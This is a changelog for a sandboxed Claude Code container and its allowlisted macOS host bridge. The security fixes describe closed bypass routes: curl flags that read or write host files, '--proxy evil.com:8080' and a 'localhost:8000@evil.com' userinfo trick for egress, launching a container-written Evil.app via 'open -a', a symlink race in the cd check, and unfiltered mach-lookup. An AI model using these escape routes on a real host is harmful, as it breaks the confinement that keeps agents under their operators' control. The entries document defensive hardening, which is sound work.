# Changelog

All notable changes to `multiplai-container` are documented here.

The format follows [Keep a Changelog](https://keepachangelog.com/en/1.1.0/).
This repo is consumed **only at an immutable tag** — `multiplai-kit/setup.sh`
pins `CONTAINER_REF` and fetches a shallow single-tag checkout — so every entry
below describes what a consumer gets by advancing that pin. Tags are never
moved; fixes ship as a new tag.

Entries are hand-written and enforced: `release.sh` refuses to cut a tag while
`## [Unreleased]` is empty.

Notes start at `v0.2`. `v0.1` was the initial import of the repo (the
sandboxed Claude Code container) and predates this changelog.

## [Unreleased]

### Added

- **The host bridge now confines path-taking commands to your workspace.** It
  has always enforced a *command allowlist*; it enforced no *filesystem
  boundary*, and those are different controls. The forced command ran with cwd
  = your home directory and no branch inspected path arguments, so
  `mlx_whisper --output-dir .` wrote into `~` on the Mac — outside the
  workspace, invisible to the container. Any allowlisted command taking an
  output path could be pointed anywhere you can write.

  Four layers now apply, in order: cwd is pinned to the declared workspace
  instead of `$HOME`; an explicit `cd` prefix is rejected when it resolves
  outside the workspace (symlinks resolved, so a link out of the tree does not
  launder it); **absolute path arguments** are rejected when they point outside
  it — `xcodebuild -derivedDataPath /Users/you/x`, `mlx_whisper --output-dir
  /Users/you/Desktop`, `swift build --scratch-path ../../..` — with the system
  toolchain prefixes (`/Applications/Xcode*.app`, `/Library/Developer`, `/usr`,
  `/opt/homebrew`) and the temporary directories still allowed, because reads
  stay open by design; and the command runs under `sandbox-exec` with the
  shipped `confine.sb` profile, which denies writes by default and allows them
  back under the workspace plus the caches builds genuinely need. Reads and
  network stay open — SDKs, model weights and config all live outside any
  workspace, and confining reads is not what was reported.

  **What the sandbox layer is, precisely.** It is a guardrail against
  *accidental and stray* writes — a tool that defaults to `$HOME`, an argument
  the checks above did not anticipate. It is **not** a boundary against code
  the container controls: `mach-lookup` and `process-exec` are unfiltered in
  the profile, so confined code can reach launchd/XPC and have an unconfined
  process act for it. That matters because `swift build` runs package-manifest
  and plugin code from the checkout by design. Filtering `mach-lookup` by
  service name would require a complete, version-dependent enumeration for
  every toolchain here, and an incomplete one breaks the tool outright rather
  than degrading — so the gap is documented in `confine.sb` (with the procedure
  for closing it) instead of being papered over. The bridge's trust model is
  unchanged: enable it only for containers running code you trust.

  **Verified on macOS 2026-08-17**, because a profile `sandbox-exec` cannot
  compile fails every bridge command and the test harness runs on Linux: the
  profile compiles; `mlx_whisper --help`, `xcodebuild -version`,
  `swift --version` and `qmd --help` all exit 0 under it (Metal init included);
  a write inside the workspace succeeds and `touch ~/.sbtest-outside` returns
  `Operation not permitted` with no file created. The first run of that smoke
  test found `(deny file-write* (with report))`, which macOS rejects outright —
  fixed here.

  **Install order matters.** The profile is installed by multiplai-kit's
  `install_host_state` from its *pinned* `container/` checkout, so between this
  tag and the kit's `CONTAINER_REF` bump every host runs with the sandbox layer
  absent and only the argv-level layers active. That is the normal state for a
  while, not an error.

### ⚠️ Breaking

- **The bridge now needs a declared workspace, and refuses path-taking commands
  without one.** The workspace cannot come from the container: a boundary
  supplied by the side being confined is not a boundary. It is read from
  `~/.local/state/multiplai/workspace` — one absolute path, host-owned, the
  same trust model as the host-browser flag.

  **Run `./setup.sh` from your multiplai-kit checkout after taking this tag.**
  It writes the file, installs the profile, and you are done. Until it runs,
  `swift`, `xcodebuild`, `xcrun`, `xcodegen`, `xcsift`, `mlx-whisper` and `qmd`
  are denied with a message naming the fix. To declare it by hand instead:

  ```
  mkdir -p ~/.local/state/multiplai
  echo /absolute/path/to/your/workspace > ~/.local/state/multiplai/workspace
  ```

  This is a deliberate, announced break rather than a warn-and-run default. A
  control that is off until someone opts in is the state that produced the bug.

  **Unaffected**, because they cannot express a path: `command -v`, `pkill`,
  `open -a Simulator`, `multiplai-gh-token`, `multiplai-docker`, `curl`.

  **`agent-browser` is deliberately outside the jail**, and that is a stated
  gap rather than an oversight. It drives a browser whose profile and cookie
  store live under `~/Library`; confining it to the workspace would either
  break it or require exempting exactly the directories worth protecting. It
  keeps the control that fits it — the explicit host opt-in added in 0.10.

  If a tool misbehaves under the profile, moving
  `~/.local/state/multiplai/confine.sb` aside drops only the `sandbox-exec`
  layer; cwd pinning, `cd` containment and the path-argument check still apply.

- **`/` and your home directory are refused as workspace values.** Both used to
  pass the "absolute and a directory" test while switching the boundary off:
  `cd` containment would admit everything reachable, and the profile's
  `(subpath (param "WORKSPACE"))` would hand back write access to the whole home
  directory including `~/.ssh`. A subdirectory of `$HOME` is the normal case and
  is unaffected.

### Fixed

- **`curl` over the bridge could read and write arbitrary host files.** Its
  branch was a deny-list of six flags behind a header calling itself an
  allowlist, and it cleared both the workspace and sandbox flags on the strength
  of that claim. Verified against curl 8.5.0: `--stderr <f>` and `--libcurl <f>`
  create or truncate any path (the second including caller-controlled request
  headers); `--remote-name-all` writes the response body into the cwd — the host
  user's home directory — under a *server*-chosen filename; `-w @<f>`,
  `-b <f>` and `--etag-compare <f>` read a host file into stdout, which the
  bridge returns to the container; `--etag-save`, `--hsts` and `--alt-svc` write;
  and `--proxy evil.com:8080` gave arbitrary outbound egress from the Mac while
  the URL argument stayed loopback.

  The branch is now a real allowlist: a named set of flags with their value
  shapes, both `--flag value` and `--flag=value` spellings, clustered short
  flags checked letter by letter, and **every unrecognised flag denied** —
  including ones curl has not shipped yet. `@file` values are refused for every
  option that honours them. `~/.curlrc` is disabled with a gateway-supplied
  `-q`, so a stray `output` line there cannot reintroduce the file write.
  Targets must still be loopback `http`/`https`, and a value with no scheme is
  now a denial rather than a pass. The one real caller — the host-browser
  skill's `curl -s --max-time 5 http://127.0.0.1:9222/json/version` — is
  covered by a test.

- **`url_ok()` returned "fine" for any argument without a scheme, and matched
  the host by string prefix.** The first let `--proxy evil.com:8080` and a bare
  `curl evil.com` through. The second let `http://localhost:8000@evil.com/`
  through — the character after `localhost` was a `:`, so the prefix matched,
  while curl reads `localhost:8000` as userinfo and connects to `evil.com`. It
  now parses the authority out, refuses userinfo, requires a numeric port, and
  is applied only to words that are meant to be targets.

- **`open -a` matched the app name with a prefix glob and ignored trailing
  arguments.** `open -a` accepts a *path* as readily as a registered app name,
  so `Simulator/../Evil.app` matched `Simulator*` — and with the workspace
  bind-mounted read-write, a container could write `$WS/Evil.app`, send
  `cd $WS && open -a Simulator/../Evil.app`, and have LaunchServices start it
  outside any sandbox (the branch clears both flags). The app name is now
  matched exactly, and the command must be exactly `open -a <app>`.

- **The `cd` that was checked was not the `cd` that ran.** Containment was
  probed in a subshell and the real `cd` happened later, so the container —
  which has the workspace mounted read-write — could swap an intermediate
  directory for a symlink in between and have the second `cd` resolve
  elsewhere. The gateway now does one `cd -P` and verifies `pwd -P` from the
  directory it is standing in.

- **The two enforcement layers could disagree about which string is the
  workspace.** The `cd` check compared symlink-resolved paths while
  `sandbox-exec` was handed the raw declared value, and SBPL `(subpath …)` is
  matched by the kernel against resolved paths. A declaration that was itself a
  symlink therefore passed containment while every write under the real
  directory was denied, with nothing naming the cause. The declared value is now
  resolved once, up front, and that single value feeds both layers.

- **`confine.sb` denied operations the allowlisted toolchains need.**
  `(deny default)` denies anything unnamed, and `iokit-open` /
  `iokit-get-properties` (Metal — `mlx-whisper` is MLX on Apple Silicon and
  initialises a Metal device before anything else), `process-info*`
  (`xcodebuild` inspecting and reaping children), `system-socket`,
  `mach-register`, `file-ioctl` and `pseudo-tty` were all missing. Added; none
  of them widens the write policy.

- **Documentation that described the wrong install mechanism.** The gateway and
  the profile both claimed `confine.sb` ships through `install_host_tool`, which
  would put it on `$PATH` at `~/.local/bin/confine.sb`. It is installed by
  `install_host_state` to `~/.local/state/multiplai/confine.sb`. The README's
  manual host-install block did not mention the workspace declaration or the
  profile at all, so a reader following it end to end hit "no workspace
  declared" with no explanation in the document that produced the state; both
  the block and the file table now cover them.

## [0.10] – 2026-08-16

### Changed

- **The host browser is now opt-in, and this is the gate.** `agent-browser` /
  `ab` is the one allowlisted verb that reaches your **real logged-in Chrome** —
  every cookie, every signed-in app. The gateway now refuses it unless a flag
  file exists on the Mac:

  ```bash
  mkdir -p ~/.local/state/multiplai
  touch ~/.local/state/multiplai/host-browser-enabled     # on
  rm ~/.local/state/multiplai/host-browser-enabled        # off
  ```

  **Advancing your pin turns the host browser off** until you create that file.
  Nothing else on the allowlist changes.

  Until now the only thing between a session and Chrome was that the skill had
  stopped advertising itself (kit #60) — a hint, not a control: anything that
  knew the verb still reached the browser. The switch is a host file precisely
  because nothing in the container can write one; an environment variable would
  arrive from the side being gated, which is why `$XDG_STATE_HOME` is
  deliberately not read even though the path is its default. A blocked run
  prints the path and both commands, so a session that needs the browser tells
  you what to type.

  The gate is checked **before** the existing `file:`-scheme block, so a
  `file:` URL with the browser off is refused as "not enabled" rather than as a
  scheme problem — a message that taught the wrong fix. Once enabled, the
  `file:` block on `open`/`goto`/`navigate` applies exactly as before.

  `tests/gateway-test.sh` covers it: 83 passed, and the nine new cases include
  the first coverage the `file:` block has ever had. Five of them fail against
  the pre-change gateway.

[0.10]: https://github.com/spikelab/multiplai-container/compare/v0.9.6...v0.10

## [0.9.6] – 2026-08-11

### Added

- **git-hooks: `git merge` and `git am` commit paths are now secret-scanned.**
  A clean merge's auto-created commit and each commit `git am` creates used to
  exec straight through the dispatcher unscanned — only pre-push caught the
  result. `pre-merge-commit` and `pre-applypatch` now run the same staged
  scan as `pre-commit` (at hook time the incoming content is already in the
  index, so index-vs-HEAD is exactly the new commit). Commit paths git offers
  no pre-commit-class hook for (`cherry-pick`, `revert`, merge-backend
  `rebase`) are documented as a known limit in the dispatch header, with
  pre-push as their backstop.
- **Dockerfile: build-time assertion that the `pre-commit` and `pre-push`
  dispatcher symlinks exist.** A typo in the symlink loop would previously
  ship an image whose secret gate never fires, with nothing failing
  anywhere; `test -L` on both scanning hooks now fails the build instead.

### Changed

- **The entrypoint's hookspath drift scan runs only for `claude` sessions.**
  `venv-sync-entrypoint.sh` ran `check-hookspath` on every start of the
  image — including the launcher's post-exit drain container, whose stdio is
  discarded (`docker run -d … >/dev/null 2>&1`), and hub driver containers.
  The scan is a warning for a human; a walk of the workspace nobody can see
  is pure cost. It is now gated on the entrypoint's first argument being
  `claude` (what the launcher passes for interactive sessions, and the
  image's default CMD).

### Fixed

- **git-hooks: repo-local hooks now run from linked worktrees, and a failed
  repo lookup no longer skips the secret scan.** The dispatcher resolved the
  repo's own hooks via `git rev-parse --git-dir`, which in a linked worktree
  returns `.git/worktrees/<name>` — a directory with no `hooks/`; git itself
  resolves hooks through the common dir. So a repo-local vetoing `pre-commit`
  or `pre-push` silently never ran for commits made from a worktree — the
  default working mode for agent sessions. The dispatcher now resolves via
  `git rev-parse --path-format=absolute --git-common-dir`, the same call
  `check-hookspath` already used (the two are now cross-referenced so they
  cannot diverge again). The same line's `|| exit 0` was also the
  dispatcher's one fail-open path: any `rev-parse` failure skipped the
  gitleaks scan entirely. A failed lookup now only empties the chain target;
  the scan runs regardless. `tests/git-hooks-test.sh` grows a linked-worktree
  fixture pinning both halves.
- **`check-hookspath` announces when its depth bound truncates the scan.**
  The `-maxdepth 7` cost ceiling silently hid any repo nested deeper — a
  clean report was indistinguishable from a complete one. The scan now emits
  a one-line stderr note when unseen territory exists past the bound (any
  directory or `.git` file at depth 8), detected by a probe that mirrors the
  main walk's pruning one level deeper — it still never descends into a
  `.git`. A fully covered tree stays silent, so the note is never ambient
  noise at container start.

[0.9.6]: https://github.com/spikelab/multiplai-container/compare/v0.9.5...v0.9.6

## [0.9.5] – 2026-08-08

### Fixed

- **`multiplai-docker`: the worktree rewrite now covers `build` paths, not
  just binds.** A worktree instance previously built its images from the
  frozen (live-tree) context — DolceEngine pip-installs `requirements.txt` at
  image build time, so a worktree that changed dependencies silently ran
  against the live tree's packages. `build.context` (and an absolute
  `build.dockerfile`) under `BIND_ROOT` now follow the instance worktree; a
  context missing from the worktree is a clean failure, checked *before* the
  bind loop can auto-create the directory and defer the error to an
  inscrutable `docker build`.
- **`multiplai-docker`: paths outside `BIND_ROOT` are loud instead of
  silent.** Bind sources and build paths the rewrite could never cover stayed
  on the live tree without a word — exactly how a DolceBot worktree instance
  ended up mounting the real `DolceFront` (`BIND_ROOT` had defaulted to
  `DolceEngine/`, the first `-f` file's directory, 2026-08-08). `freeze` now
  prints a `NOTE:` listing every such path, and `up`/`build` on a worktree
  instance warn on stderr — both pointing at the `--bind-root` remedy.

[0.9.5]: https://github.com/spikelab/multiplai-container/compare/v0.9.4...v0.9.5

## [0.9.4] – 2026-08-08

### Added

- **`ast-grep` 0.45.1 is on PATH in the image** (`npm install -g --prefix
  /opt/ast-grep @ast-grep/cli`, symlinked next to the existing LSP servers).
  The private prefix is not decoration: the package also ships an `sg` bin,
  which at npm's `/usr` global prefix collides with `/usr/bin/sg` (the
  setgroup utility from the `login` package) and fails the build with
  `EEXIST` — and `--force` would overwrite a system binary. Only the
  `ast-grep` name is exposed; the `sg` shorthand stays buried.

  It is the structural
  search tier the image was missing: an audit of 111,780 real tool calls found
  **zero** symbol-level lookups — 100% of code navigation was lexical `grep` —
  and the "grep for a name, then `Read` the whole file to see the definition"
  loop is why the `Read` tool accounts for 72% of every byte of tool output
  that reaches a context window. Measured against a neighbouring repo:
  `ast-grep --pattern 'def NAME($$$)' --lang py` returns the definition node in
  **2.6 KB** where reading the containing file costs **53.8 KB**.

  It does not replace `grep`, and the rules shipped by the kit say so: `grep`
  is still cheaper for locating a bare name (264 B for the same question) and
  is the only option for prose, logs, and config. `ast-grep` earns its place on
  structural questions, and on the languages the two installed LSP servers
  (Python, TypeScript) do not cover — Swift, Go, Rust, shell.

[0.9.4]: https://github.com/spikelab/multiplai-container/compare/v0.9.3...v0.9.4

## [0.9.3] – 2026-08-06

### Fixed

- **Worktree instances were impossible.** The bind rewrite refused any bind
  whose worktree counterpart did not exist, to catch a mis-rebased path. But a
  gitignored runtime-artifact directory is absent from every fresh worktree *by
  definition* — DolceEngine binds `./logs`, which `.gitignore` excludes — so
  `up <profile> --instance <worktree>` failed every time, on the one runtime
  transform the tool exists for. It now mirrors the original: an existing
  source **directory** gets its counterpart created (Docker would create it
  anyway, as root); a missing **file**, or a source absent from the source tree
  too, is still a clean failure. Found by the first real worktree bring-up.

### Testing

- The reap fixture generated a "fresh" container timestamp instead of
  hardcoding one. A literal date made that test pass only within 24h of the day
  it was written, then fail for reasons unrelated to the code (it did, the next
  morning).

[0.9.3]: https://github.com/spikelab/multiplai-container/compare/v0.9.2...v0.9.3

## [0.9.2] – 2026-08-06

### Changed

- **`up` now waits for healthchecks** (`up -d --wait --wait-timeout 600`), so
  "the command returned" means "the stack is usable". Containers reach `running`
  in seconds while an entrypoint that runs database migrations needs minutes; an
  agent that `exec`s into that gap reads a half-migrated schema and misdiagnoses
  it as a data bug. Observed 2026-08-06: a seed 38s after `up` failed with
  `Column 'last_login' cannot be null`, because `auth.0001_initial` had been
  applied and `auth.0005_alter_user_last_login_null` had not. `up` prints a
  heads-up before waiting, and on timeout points at `ps`/`logs` rather than just
  failing. Bounded at 600s — Compose's own default is to wait forever.

[0.9.2]: https://github.com/spikelab/multiplai-container/compare/v0.9.1...v0.9.2

## [0.9.1] – 2026-08-06

### Fixed

- **`multiplai-docker freeze`: instances shared one volume set and one
  network.** `docker compose config` *resolves* top-level volume and network
  names against the source project and emits them as explicit `name:` keys
  (`dolceengine_mysql_data`), so the frozen file pinned them for every instance
  — `--instance a` and `--instance b` would have run against the same MySQL
  volume and the same network, defeating the isolation the tool exists for.
  `freeze` now drops the resolved `name` from every non-`external` volume and
  network so Compose re-derives `<project>_<key>` per instance. `external: true`
  entries name something the stack does not own, so their name is kept.
  **Existing profiles must be re-frozen** — the fix is in `freeze`, not at run
  time. Caught by a real `up`, not the harness; the stub fixture now carries
  resolved names and both halves mutate-check.

### Added

- **`up` prints the reachable URLs.** Host ports are stripped so instances can
  coexist, which left no hint of how to reach the stack. `freeze` now records
  the container-side targets of the ports it strips as `x-multiplai-ports`, and
  `up` prints `http://<container>.orb.local:<port>` per service. Ports come from
  the frozen file — the tool never probes a container.

[0.9.1]: https://github.com/spikelab/multiplai-container/compare/v0.9...v0.9.1

## [0.9] – 2026-08-06

### Added

- **`multiplai-docker` — controlled Docker Compose access from a session
  container.** A session can now start, inspect and tear down **parallel named
  instances** of an allowlisted set of Compose stacks on the Mac, mid-session,
  over the existing SSH bridge, without ever authoring a Docker argument or a
  compose file:

  ```
  ssh host.docker.internal multiplai-docker up   dolce --instance wt1
  ssh host.docker.internal multiplai-docker ls   dolce
  ssh host.docker.internal multiplai-docker logs dolce engine 200 --instance wt1
  ssh host.docker.internal multiplai-docker exec dolce engine --instance wt1 -- python manage.py showmigrations
  ssh host.docker.internal multiplai-docker down dolce --instance wt1
  ```

  The design closes the hole by construction rather than by validation: a
  **profile** is a compose configuration you resolved and froze once on the Mac
  (`multiplai-docker freeze`), stored outside every container mount. The agent
  supplies only labels — a profile name, a verb from a fixed list, an instance
  name, a service name, a numeric tail, and charset-guarded guest argv for
  `exec`. Agent input never reaches Compose, so there is no runtime validator to
  bypass and no TOCTOU window. Instances are ephemeral by construction: the
  compose project is `<prefix>-<instance>`, so named volumes are per-instance
  and `down` always runs `down -v`; `reap-older-than <hours>` catches leaks.
  Published ports are stripped at freeze time, so parallel instances never
  collide — reach services by their OrbStack hostnames.

  Three agents in three worktrees can run `up <profile> --instance wt1|wt2|wt3`
  and get three isolated stacks, each bind-mounting its own worktree's code: the
  one runtime transform re-prefixes binds under `BIND_ROOT` into
  `WORKTREE_ROOT/<instance>` when a worktree of that name exists.

- **Gateway allowlist entry for `multiplai-docker`** — one new branch in
  `container-build-gateway.sh`, holding the verb to a fixed list, the profile
  and instance names to their regexes, and rejecting every caller-supplied flag
  other than `--instance <token>`. `freeze` is deliberately **not** in that list:
  creating or changing a profile is a host-terminal act, so bridge callers are
  denied before the script runs. The no-shell-reparse invariant is untouched —
  argv still travels as data, and argv[0] is pinned to a host-side constant.

- **`tests/multiplai-docker-test.sh`** — a stub-docker harness (no daemon, no
  network) asserting the argv the tool hands Compose: the frozen file verbatim
  when no worktree matches, a temp file with re-prefixed binds and untouched
  named volumes when one does, `down -v`, the per-instance project name, the
  `exec` guest-argv charset, the log-tail cap, the drift warning, and the
  refusal of group/world-writable or symlinked profile files. Wired into CI
  alongside the gateway harness, which gained matching allowlist cases.

### Setup

After `git pull && ./setup.sh`, **each profile must be frozen once on the Mac**
before a session can use it — this is the trust step, and it is the only place
compose input is established:

```bash
multiplai-docker freeze dolce \
  -f ~/Documents/knowhere/PROJECTS/DolceBot/DolceEngine/docker-compose.yml \
  -f ~/Documents/knowhere/PROJECTS/DolceBot/DolceEngine/docker-compose.dev.yml
# then review ~/.local/share/multiplai/docker-profiles/dolce.json once
```

`freeze` derives `PROJECT_DIR`/`BIND_ROOT` from the first `-f` file's directory
and `WORKTREE_ROOT` from the nearest ancestor holding a `.worktrees/` directory;
`--project-dir`, `--bind-root`, `--worktree-root` and `--prefix` override each.
No `authorized_keys` change is needed — the existing forced command covers it.

### Changed

- CI now runs `shellcheck` over **every** shipped shell script except
  `container-build-gateway.sh`, which is zsh on purpose and will never be
  shellcheck-able (`zsh -n` and `tests/gateway-test.sh` cover it instead).
  Previously four scripts were excluded, including `release.sh` and both test
  harnesses — the files where a shell bug is least visible and most expensive.
  The findings were a false positive on git's `@{u}` rev syntax, two on the
  deliberately-unexpanded injection payloads in the gateway harness, and style
  findings in the Apple Containers experiment; each is now either fixed or
  carries a scoped directive saying why it stands.

[0.9]: https://github.com/spikelab/multiplai-container/compare/v0.8...v0.9

## [0.8] – 2026-08-03

### Added

- **Container-wide secret-leak gate.** `git-hooks/dispatch` is installed as
  every git hook via `core.hooksPath` in `/etc/gitconfig`, so every
  repository touched inside the container is gated by default, with no
  per-repo setup and nothing to forget on a fresh clone. `pre-commit` scans
  the staged diff (blocking before a commit object exists); `pre-push` scans
  the range being pushed, which is the backstop for `--no-verify` and for
  commits made outside the container, and the only secret gate private repos
  get — GitHub's free secret scanning and push protection cover public repos
  only. Findings are always `--redact`ed, so a leak report never echoes the
  credential into scrollback, CI logs, or an agent transcript. The dispatcher
  itself offers exactly one bypass, `--no-verify`: there is deliberately no
  env-var skip, which an agent could take on its own mid-task. One caveat is
  inherent to git's config precedence and is NOT covered by the gate: a
  repo-local `core.hooksPath` (what husky/lefthook-style installs write),
  `git -c core.hooksPath=…`, or `GIT_CONFIG_NOSYSTEM=1` outranks system
  config and un-gates that repo — the container entrypoint runs
  `git-hooks/check-hookspath` at start to *warn* (never block) about
  workspace repos with such an override.
  The `pre-push` range construction fails **closed**: when the remote tip
  being replaced is absent from the local odb (typical after the history
  rewrite + force-push the leak banner itself recommends), the scan falls
  back to everything no remote-tracking ref already has, and a range git
  cannot walk at all aborts the push with an explicit scan-error message —
  gitleaks 8.29.0 exits 0 on an invalid range, so an unvalidated range would
  silently scan nothing.
  Repo-local hooks are preserved: `core.hooksPath` *replaces* `.git/hooks`
  rather than adding to it, so the dispatcher chains to each repository's own
  hook of the same name (replaying `pre-push` stdin ref lines verbatim, and
  handing EOF through when there is nothing to replay — via a here-string, not
  a pipe, because under `pipefail` a repo hook that exits without draining
  stdin makes the writer take SIGPIPE once the ref list passes the 64K pipe
  buffer, rejecting the push with no finding and no message). Receive-side hook
  names (`pre-receive`, `update`, `post-receive`, `post-update`,
  `proc-receive`, `push-to-checkout`, `fsmonitor-watchman`) are symlinked
  too, so bare-repo hooks still chain. Without that delegation, installing
  this gate would have silently disabled every existing per-repo hook —
  trading one control for another is not a net gain.
- `git-hooks/gitleaks.toml` — the ruleset the hooks enforce: gitleaks' defaults
  (`useDefault = true`) plus the patterns those defaults **verifiably miss**.
  Tested against gitleaks 8.29.0, which returns "no leaks found" for
  `sk-ant-api03-…`, `sk-ant-oat01-…`, and the exact shape of
  `~/.claude/.credentials.json` — the highest-value credential in this
  environment, since the kit mounts that file into every session. Adds an
  `sk-ant-*` family rule and a database/broker-URL-with-inline-password rule
  (with placeholder allowlisting so `env.example` files stay quiet).
  Complements `multiplai-gh-token`'s transcript hygiene from v0.7: that keeps a
  minted `ghs_` token from being printed, this keeps any credential from being
  committed.
- `gitleaks` 8.29.0 in the image (`GITLEAKS_VERSION`), backing the above. The
  release tarball is now pinned by per-arch SHA256
  (`GITLEAKS_SHA256_X64`/`_ARM64`, from upstream's checksums asset) and
  verified with `sha256sum -c` before extraction — a re-tagged release asset
  or CDN compromise fails the build instead of going undetected. Bump the
  SHA args together with `GITLEAKS_VERSION`.
- `git-hooks/check-hookspath` — warn-only drift check run by the entrypoint,
  covering both ways a repo slips out from under the gate. It scans
  `$WORKSPACE` for repos whose *local* `core.hooksPath` overrides (and
  therefore bypasses) the container-wide gate, **and** for repo-local hooks
  whose names the dispatcher does not symlink and so never run at all —
  `core.hooksPath` replaces `.git/hooks`, so the names deliberately left out of
  the Dockerfile loop (`reference-transaction`, `pre-auto-gc`,
  `post-index-change`) are a real hole, and the same warn-don't-block treatment
  applies. The covered set is read from the dispatcher symlinks at runtime
  rather than restated here, so the Dockerfile loop cannot drift away from the
  check; where that set cannot be determined (a source checkout, where the
  symlinks exist only in the built image) the check is skipped rather than
  guessed at. Depth reaches nested worktrees and sub-projects — this workspace
  has three repos deeper than the original bound saw at all.
- `tests/git-hooks-test.sh` — 30 assertions over throwaway repos: detection and
  redaction on commit and push, the new-branch (`remote_sha` all-zeros) push
  range, the stale-clone force-push regression (unknown remote tip must still
  be scanned; an unwalkable range must fail closed as a scan error),
  empty-stdin replay as EOF, an 800-ref replay to a repo hook that never reads
  stdin (the SIGPIPE case above), both `check-hookspath` warnings plus its
  depth reach and its skip-rather-than-guess path, placeholder URLs staying
  quiet, and both fail-closed paths (missing binary, missing
  ruleset — neither may silently fall back to upstream defaults). Wired into
  CI, which reads `GITLEAKS_VERSION` and `GITLEAKS_SHA256_X64` straight out
  of the Dockerfile so the tested and shipped binaries cannot drift.

[0.8]: https://github.com/spikelab/multiplai-container/compare/v0.7...v0.8

## [0.7] – 2026-07-30

### Added

- `multiplai-gh-token` — host-side minter for **GitHub App installation
  tokens**. Several Apps live side by side as named profiles under
  `~/.local/state/multiplai-gh-token/<app>/{app-id,app.pem,org}`; the App's
  private key never enters a container, which receives only a 1-hour `ghs_`
  token over the SSH bridge. Modes are enforced (700 dir, 600 files, no
  symlinks), every mint is audited to `mint.log`, and `--check` diagnoses a
  credential directory with **no network call and no token printed** — the
  form that is safe inside an agent transcript. Consumed by the kit's
  `GH_TOKEN_APP` mode; setup in `docs/gh-app-token.md`.
- Gateway allowlist branch for `multiplai-gh-token`: at most a leading
  `--json`/`--check` plus one app name, name validated against
  `[A-Za-z0-9._-]`, every other flag rejected, argv[0] pinned to
  `$HOME/.local/bin/multiplai-gh-token` (`~/.local/bin` is not on the login
  PATH the gateway resolves through). Twelve ALLOW/DENY cases in
  `tests/gateway-test.sh` cover it, including the argv[0] rewrite.
- `docs/gh-app-token.md` — host setup guide: creating and installing the App,
  the credential layout and permission recipe, the threat-model table, the
  settled Keychain / Secure-Enclave / 1Password rulings, transcript hygiene
  plus the self-revoke recipe, the audit log, and migration from the
  single-App predecessor `dolce-gh-token`.

- `CHANGELOG.md` (this file), backfilled for every existing tag, so a consumer
  can see what advancing `CONTAINER_REF` actually gets them.
- `SECURITY.md` — threat model of the optional macOS host bridge, supported
  versions, reporting address, and the gateway invariant contributors must
  preserve.
- `release.sh` changelog gate: a release is refused unless `## [Unreleased]`
  has content; on a real release the section is renamed to the new version,
  dated, given a compare link, and committed with the release commit. There is
  deliberately no `--skip-changelog`.
- CI (`.github/workflows/ci.yml`): syntax checks over every shipped script
  (`bash -n`, `zsh -n` for the gateway), `shellcheck` over the scripts that
  pass it cleanly, and the gateway allowlist test suite
  (`tests/gateway-test.sh`).

### Changed

- `README.md`: the `Files` table now lists every shipped file, including
  `md2pdf` and `tests/gateway-test.sh`; the intro no longer links the kit under
  the name "Multiplai" (the umbrella banner is the single suite pointer).
- `README.md` restructured usage-first: the standalone `docker run` quickstart
  now directly follows the intro, and the file inventory sits below all usage
  sections. The "Releasing (maintainers)" section moved to `CLAUDE.md` (which
  now carries the full flow, including the changelog gate); a one-line pointer
  remains in the README. The host-bridge security callout is unchanged, only
  repositioned.

[0.7]: https://github.com/spikelab/multiplai-container/compare/v0.6...v0.7

## [0.6] – 2026-07-26

### Fixed

- Host gateway: a `cd` prefix whose path contains spaces or parentheses now
  works — the workdir is unquoted through the same tokenizer as the rest of
  argv (previously it arrived `%q`-escaped and was used verbatim).
- `release.sh`: the kit-pin rewrite is mode-preserving. The v0.5 rewrite
  replaced the kit's `setup.sh` with a `0600` temp file and silently dropped
  its executable bit; the script now writes in place and verifies `-x`.
- `release.sh`: pushes are atomic (`git push --atomic main <tag>`), so a raced
  rejection can no longer leave an orphaned public tag, and no `eval` is used
  on any computed value.

### Added

- `tests/gateway-test.sh` — a 29-case ALLOW/DENY harness that runs the gateway
  the way `sshd` does, against stub commands. This is the only automated test
  of the container→host security boundary.
- `release.sh` preflight on the kit checkout: it refuses a kit that is not on
  `main` and in sync with `origin/main`, which rules out publishing from a
  runtime checkout (`~/.multiplai-runtimes/*`) or a stale clone.
- `README.md` links the Multiplai umbrella repo.

### Security

- The gateway's metacharacter deny-list is escape-aware: backslash-escaped
  characters travel only as argv data and are stripped before the check, while
  every unescaped metacharacter (and any raw newline) is still denied. No shell
  ever re-parses client input.
- The `xcsift` pipe suffix is honoured only on `swift`/`xcodebuild`/`xcrun`
  heads; `qmd`, `curl` and friends with that suffix are now denied.

[0.6]: https://github.com/spikelab/multiplai-container/compare/v0.5...v0.6

## [0.5] – 2026-07-15

### Added

- `release.sh` — build-gated release tooling that makes the two-repo release
  one command: refuse unless `main` is clean and in sync, require `docker
  build` to pass, tag, bump the kit's `CONTAINER_REF`, then push both repos
  back-to-back. Ships with `VERSION` (last released version) and `CLAUDE.md`
  (the repo's release contract and gateway invariant).
- The image exports `MULTIPLAI_CONTAINER=1`, so marketplace skills detect the
  container explicitly instead of inferring it from `uname` — and can decide
  whether host-bridge instructions belong in an error message.
- `sqlite3` CLI in the image.

### Changed

- PySceneDetect + headless OpenCV are no longer baked into the image. They were
  added for the `screen-demo` skill during this cycle and removed again before
  the tag, because the OpenCV wheel dominated the image size.

### Fixed

- Host gateway `PATH`: `qmd` resolves via `~/.bun/bin`, and nvm's node24 bin is
  prepended so `qmd`'s `better-sqlite3` finds the ABI it was built against
  (Homebrew node had drifted to 26).
- Host gateway allowlist: `swift-build`'s trusted `xcsift` pipe and
  `swift --version` are permitted.

### Documentation

- README: which skills work with and without the host bridge, and a note on
  `MULTIPLAI_CONTAINER`.

[0.5]: https://github.com/spikelab/multiplai-container/compare/v0.4...v0.5

## [0.4] – 2026-07-08

### Added

- Markdown → PDF toolchain baked into the image: `pandoc` + `typst` (two static
  binaries, no system deps) plus the `md2pdf` wrapper, so the canonical
  `pandoc --pdf-engine=typst` invocation is one command and a bare
  `pandoc -o x.pdf` (which would reach for the absent pdflatex) is not needed.
- Host gateway allowlist: `qmd` `search`/`index` subcommands.

### Fixed

- `venv-sync-entrypoint.sh` invokes pip as `python -m pip`.

[0.4]: https://github.com/spikelab/multiplai-container/compare/v0.3...v0.4

## [0.3] – 2026-07-06

### Security

- `ab` can no longer read host files through the real Chrome: the `file:`
  scheme is blocked on its navigation verbs (`open`/`goto`/`navigate`), closing
  the same exfiltration path the `curl` guard already covered. `agent-browser`
  was split out of the blanket allowlist to make this possible.
- `build.sh` refuses to build with the `.env.example` `WORKSPACE` placeholder or
  a non-existent path.
- README documents the host-bridge trust model prominently: enabling the bridge
  grants the container host-side code execution (Swift/Xcode build scripts and
  plugins) and host-file read (via Chrome) — not "a locked-down SSH shell".
